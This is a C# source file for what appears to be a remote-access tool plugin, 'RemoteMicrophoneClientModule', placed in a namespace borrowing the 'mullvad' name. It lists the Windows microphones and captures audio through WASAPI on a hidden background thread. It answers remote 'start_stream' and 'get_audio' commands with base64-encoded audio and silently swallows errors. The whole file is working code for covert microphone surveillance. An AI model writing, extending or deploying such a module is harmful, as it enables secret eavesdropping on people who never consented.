using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace mullvad.Module.RemoteMicrophone
{
    public sealed class RemoteMicrophoneClientModule
    {
        public static string ModuleId => "mullvad.remotemicrophone";

        private static volatile bool _running;
        private static Thread        _captureThread;
        private static int           _deviceIndex;

        private static readonly SemaphoreSlim _readySig  = new SemaphoreSlim(0, 1);
        private static byte[]                 _audioData;
        private static readonly object        _audioLock = new object();

        // Output format: 44100 Hz, stereo, 16-bit PCM
        private const int OUT_SAMPLE_RATE = 44100;
        private const int OUT_CHANNELS    = 2;
        private const int OUT_BITS        = 16;

        public string Execute(string action, string payload)
        {
            try
            {
                switch (action)
                {
                    case "devices":      return ListDevices();
                    case "start_stream": return StartStream(payload);
                    case "get_audio":    return GetAudio();
                    case "stop_stream":  return StopStream();
                    default:             return Err("unknown action: " + action);
                }
            }
            catch (Exception ex) { return Err(ex.Message); }
        }

        // ── Device enumeration ────────────────────────────────────────────────

        private static string ListDevices()
        {
            var sb = new StringBuilder("[");
            bool first = true;

            try
            {
                var devEnumType = Type.GetTypeFromCLSID(new Guid("BCDE0395-E52F-467C-8E3D-C4579291692E"));
                if (devEnumType != null)
                {
                    var devEnum = (IMMDeviceEnumerator)Activator.CreateInstance(devEnumType);
                    IMMDeviceCollection col;
                    devEnum.EnumAudioEndpoints(1, 1, out col); // eCapture=1, ACTIVE=1
                    uint count;
                    col.GetCount(out count);
                    for (uint i = 0; i < count; i++)
                    {
                        IMMDevice dev;
                        col.Item(i, out dev);
                        var name = GetDeviceName(dev);
                        Marshal.ReleaseComObject(dev);
                        if (!first) sb.Append(',');
                        first = false;
                        sb.Append("{\"id\":").Append(i).Append(",\"name\":\"").Append(EscJson(name)).Append("\"}");
                    }
                    Marshal.ReleaseComObject(col);
                    Marshal.ReleaseComObject(devEnum);
                }
            }
            catch { }

            sb.Append(']');
            return sb.ToString();
        }

        private static string GetDeviceName(IMMDevice dev)
        {
            try
            {
                IPropertyStore store;
                dev.OpenPropertyStore(0, out store);
                var key = new PROPERTYKEY { fmtid = new Guid("A45C254E-DF1C-4EFD-8020-67D146A850E0"), pid = 14 };
                var pv  = new PROPVARIANT();
                store.GetValue(ref key, out pv);
                string name = pv.vt == 31 ? Marshal.PtrToStringUni(pv.p) ?? "Microphone" : "Microphone";
                PropVariantClear(ref pv);
                Marshal.ReleaseComObject(store);
                return name;
            }
            catch { return "Microphone"; }
        }

        // ── Stream control ────────────────────────────────────────────────────

        private static string StartStream(string payload)
        {
            if (_running)
            {
                _running = false;
                try { if (_readySig.CurrentCount == 0) _readySig.Release(); } catch { }
                _captureThread?.Join(500);
            }

            _deviceIndex = ParseInt(payload, "device", 0);
            _running     = true;

            _captureThread = new Thread(CaptureLoop) { IsBackground = true, Name = "MicCapture" };
            _captureThread.Start();

            return "{\"status\":\"ok\",\"sampleRate\":" + OUT_SAMPLE_RATE +
                   ",\"channels\":" + OUT_CHANNELS + ",\"bits\":" + OUT_BITS + "}";
        }

        private static string StopStream()
        {
            _running = false;
            try { if (_readySig.CurrentCount == 0) _readySig.Release(); } catch { }
            return "{\"status\":\"ok\"}";
        }

        private static string GetAudio()
        {
            if (!_running) return "{\"ok\":false,\"reason\":\"not_streaming\"}";

            bool got = _readySig.Wait(2000);
            if (!got || !_running) return "{\"ok\":false}";

            byte[] data;
            lock (_audioLock) { data = _audioData; }
            if (data == null || data.Length == 0) return "{\"ok\":false}";

            return "{\"ok\":true,\"data\":\"" + Convert.ToBase64String(data) + "\"}";
        }

        // ── WASAPI capture loop ───────────────────────────────────────────────

        private static void CaptureLoop()
        {
            try
            {
                var devEnumType = Type.GetTypeFromCLSID(new Guid("BCDE0395-E52F-467C-8E3D-C4579291692E"));
                if (devEnumType == null) return;
                var devEnum = (IMMDeviceEnumerator)Activator.CreateInstance(devEnumType);

                IMMDevice device = null;
                try
                {
                    IMMDeviceCollection col;
                    devEnum.EnumAudioEndpoints(1, 1, out col); // eCapture
                    uint count;
                    col.GetCount(out count);
                    uint idx = (uint)_deviceIndex;
                    if (idx < count)
                        col.Item(idx, out device);
                    else if (count > 0)
                        col.Item(0, out device);
                    Marshal.ReleaseComObject(col);
                }
                catch { }

                if (device == null)
                {
                    // Fallback: default capture device
                    devEnum.GetDefaultAudioEndpoint(1, 0, out device); // eCapture, eCommunications
                }

                Marshal.ReleaseComObject(devEnum);

                IAudioClient client;
                device.Activate(new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"), 0, IntPtr.Zero, out client);
                Marshal.ReleaseComObject(device);

                IntPtr pFmt;
                client.GetMixFormat(out pFmt);

                // Initialize WITHOUT loopback flag — this is a microphone (capture device)
                client.Initialize(0 /*SHARED*/, 0, 2000000 /*200ms buffer*/, 0, pFmt, Guid.Empty);

                uint bufferFrames;
                client.GetBufferSize(out bufferFrames);

                IAudioCaptureClient captureClient;
                client.GetService(new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"), out captureClient);

                client.Start();

                var wfx = (WAVEFORMATEX)Marshal.PtrToStructure(pFmt, typeof(WAVEFORMATEX));
                int srcSampleRate = (int)wfx.nSamplesPerSec;
                int srcChannels   = (int)wfx.nChannels;
                short srcBits     = wfx.wBitsPerSample;
                short srcFormat   = wfx.wFormatTag; // 1=PCM, 3=float, 0xFFFE=ext

                if (srcFormat == unchecked((short)0xFFFE))
                {
                    var extFmt = (WAVEFORMATEXTENSIBLE)Marshal.PtrToStructure(pFmt, typeof(WAVEFORMATEXTENSIBLE));
                    // SubFormat KSDATAFORMAT_SUBTYPE_PCM = {00000001-...}, SUBTYPE_IEEE_FLOAT = {00000003-...}
                    byte[] subBytes = extFmt.SubFormat.ToByteArray();
                    srcFormat = (short)(subBytes[0] | (subBytes[1] << 8));
                }

                CoTaskMemFree(pFmt);

                // Collect ~50ms per chunk before releasing
                int samplesPerChunk = srcSampleRate / 20;

                while (_running)
                {
                    uint packetSize;
                    captureClient.GetNextPacketSize(out packetSize);

                    var raw = new System.Collections.Generic.List<byte>(samplesPerChunk * srcChannels * (srcBits / 8));

                    while (packetSize > 0 && _running)
                    {
                        IntPtr dataPtr;
                        uint numFrames, flags;
                        ulong pos, ts;
                        captureClient.GetBuffer(out dataPtr, out numFrames, out flags, out pos, out ts);

                        int byteCount = (int)numFrames * srcChannels * (srcBits / 8);
                        if ((flags & 2) == 0 && byteCount > 0) // not silent
                        {
                            byte[] buf = new byte[byteCount];
                            Marshal.Copy(dataPtr, buf, 0, byteCount);
                            raw.AddRange(buf);
                        }
                        captureClient.ReleaseBuffer(numFrames);
                        captureClient.GetNextPacketSize(out packetSize);
                    }

                    if (raw.Count > 0)
                    {
                        byte[] converted = ConvertToInt16Stereo44100(raw.ToArray(), srcFormat, srcSampleRate, srcChannels, srcBits);
                        lock (_audioLock) { _audioData = converted; }
                        if (_readySig.CurrentCount == 0) _readySig.Release();
                    }

                    Thread.Sleep(20);
                }

                client.Stop();
                Marshal.ReleaseComObject(captureClient);
                Marshal.ReleaseComObject(client);
            }
            catch { }
        }

        private static byte[] ConvertToInt16Stereo44100(byte[] src, short fmt, int srcRate, int srcCh, short srcBits)
        {
            int bytesPerSample = srcBits / 8;
            int srcFrames      = src.Length / (srcCh * bytesPerSample);

            double ratio      = (double)OUT_SAMPLE_RATE / srcRate;
            int outFrames     = (int)(srcFrames * ratio) + 1;
            var dst           = new byte[outFrames * OUT_CHANNELS * 2];
            int written       = 0;

            for (int i = 0; i < outFrames; i++)
            {
                double srcPos = i / ratio;
                int    s0     = (int)srcPos;
                if (s0 >= srcFrames) break;

                short[] chSamples = new short[srcCh];
                for (int c = 0; c < srcCh; c++)
                {
                    int offset = (s0 * srcCh + c) * bytesPerSample;
                    chSamples[c] = ReadSample(src, offset, fmt, srcBits);
                }

                short left  = chSamples[0];
                short right = srcCh > 1 ? chSamples[1] : left;

                if (written + 3 < dst.Length)
                {
                    dst[written++] = (byte)(left  & 0xFF);
                    dst[written++] = (byte)(left  >> 8);
                    dst[written++] = (byte)(right & 0xFF);
                    dst[written++] = (byte)(right >> 8);
                }
            }

            var result = new byte[written];
            Buffer.BlockCopy(dst, 0, result, 0, written);
            return result;
        }

        private static short ReadSample(byte[] src, int offset, short fmt, short bits)
        {
            if (offset < 0 || offset + bits / 8 > src.Length) return 0;
            if (fmt == 3) // float32
            {
                if (bits == 32 && offset + 3 < src.Length)
                {
                    float f = BitConverter.ToSingle(src, offset);
                    return (short)Math.Max(-32768, Math.Min(32767, (int)(f * 32767f)));
                }
                return 0;
            }
            if (bits == 16) return BitConverter.ToInt16(src, offset);
            if (bits == 32) return (short)(BitConverter.ToInt32(src, offset) >> 16);
            if (bits == 8)  return (short)((src[offset] - 128) << 8);
            return 0;
        }

        // ── COM interfaces ────────────────────────────────────────────────────

        [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IMMDeviceEnumerator
        {
            [PreserveSig] int EnumAudioEndpoints(int dataFlow, uint dwStateMask, out IMMDeviceCollection ppDevices);
            [PreserveSig] int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppEndpoint);
            [PreserveSig] int GetDevice([MarshalAs(UnmanagedType.LPWStr)] string pwstrId, out IMMDevice ppDevice);
            [PreserveSig] int RegisterEndpointNotificationCallback(IntPtr pClient);
            [PreserveSig] int UnregisterEndpointNotificationCallback(IntPtr pClient);
        }

        [ComImport, Guid("0BD7A1BE-7A1A-44DB-8397-CC5392387B5E"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IMMDeviceCollection
        {
            [PreserveSig] int GetCount(out uint pcDevices);
            [PreserveSig] int Item(uint nDevice, out IMMDevice ppDevice);
        }

        [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IMMDevice
        {
            [PreserveSig] int Activate(ref Guid iid, uint dwClsCtx, IntPtr pActivationParams, out IAudioClient ppInterface);
            [PreserveSig] int OpenPropertyStore(uint stgmAccess, out IPropertyStore ppProperties);
            [PreserveSig] int GetId([MarshalAs(UnmanagedType.LPWStr)] out string ppstrId);
            [PreserveSig] int GetState(out uint pdwState);
        }

        [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IAudioClient
        {
            [PreserveSig] int Initialize(int ShareMode, uint StreamFlags, long hnsBufferDuration, long hnsPeriodicity, IntPtr pFormat, [MarshalAs(UnmanagedType.LPStruct)] Guid AudioSessionGuid);
            [PreserveSig] int GetBufferSize(out uint pNumBufferFrames);
            [PreserveSig] int GetStreamLatency(out long phnsLatency);
            [PreserveSig] int GetCurrentPadding(out uint pNumPaddingFrames);
            [PreserveSig] int IsFormatSupported(int ShareMode, IntPtr pFormat, out IntPtr ppClosestMatch);
            [PreserveSig] int GetMixFormat(out IntPtr ppDeviceFormat);
            [PreserveSig] int GetDevicePeriod(out long phnsDefaultDevicePeriod, out long phnsMinimumDevicePeriod);
            [PreserveSig] int Start();
            [PreserveSig] int Stop();
            [PreserveSig] int Reset();
            [PreserveSig] int SetEventHandle(IntPtr eventHandle);
            [PreserveSig] int GetService(ref Guid riid, out IAudioCaptureClient ppv);
        }

        [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IAudioCaptureClient
        {
            [PreserveSig] int GetBuffer(out IntPtr ppData, out uint pNumFramesAvailable, out uint pdwFlags, out ulong pu64DevicePosition, out ulong pu64QPCPosition);
            [PreserveSig] int ReleaseBuffer(uint NumFramesRead);
            [PreserveSig] int GetNextPacketSize(out uint pNumFramesInNextPacket);
        }

        [ComImport, Guid("886D8EEB-8CF2-4446-8D02-CDBA1DBDCF99"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IPropertyStore
        {
            [PreserveSig] int GetCount(out uint cProps);
            [PreserveSig] int GetAt(uint iProp, out PROPERTYKEY pkey);
            [PreserveSig] int GetValue(ref PROPERTYKEY key, out PROPVARIANT pv);
            [PreserveSig] int SetValue(ref PROPERTYKEY key, ref PROPVARIANT propvar);
            [PreserveSig] int Commit();
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROPERTYKEY { public Guid fmtid; public uint pid; }

        [StructLayout(LayoutKind.Sequential)]
        struct PROPVARIANT { public short vt; public short r1, r2, r3; public IntPtr p; }

        [StructLayout(LayoutKind.Sequential)]
        struct WAVEFORMATEX
        {
            public short wFormatTag; public short nChannels;
            public uint nSamplesPerSec, nAvgBytesPerSec;
            public short nBlockAlign, wBitsPerSample, cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WAVEFORMATEXTENSIBLE
        {
            public short wFormatTag, nChannels; public uint nSamplesPerSec, nAvgBytesPerSec;
            public short nBlockAlign, wBitsPerSample, cbSize, wValidBitsPerSample;
            public uint dwChannelMask; public Guid SubFormat;
        }

        [DllImport("ole32.dll")] static extern void PropVariantClear(ref PROPVARIANT pvar);
        [DllImport("ole32.dll")] static extern void CoTaskMemFree(IntPtr ptr);

        // ── Helpers ───────────────────────────────────────────────────────────

        private static int ParseInt(string json, string key, int def)
        {
            if (string.IsNullOrEmpty(json)) return def;
            var k = "\"" + key + "\""; int idx = json.IndexOf(k); if (idx < 0) return def;
            int c = json.IndexOf(':', idx + k.Length); if (c < 0) return def;
            int s = c + 1; while (s < json.Length && json[s] == ' ') s++;
            bool neg = s < json.Length && json[s] == '-'; if (neg) s++;
            int e = s; while (e < json.Length && char.IsDigit(json[e])) e++;
            return e == s ? def : int.TryParse(json.Substring(s, e - s), out int v) ? (neg ? -v : v) : def;
        }

        private static string EscJson(string s)
        {
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }

        private static string Err(string msg)
        {
            return "{\"error\":\"" + EscJson(msg) + "\"}";
        }
    }
}
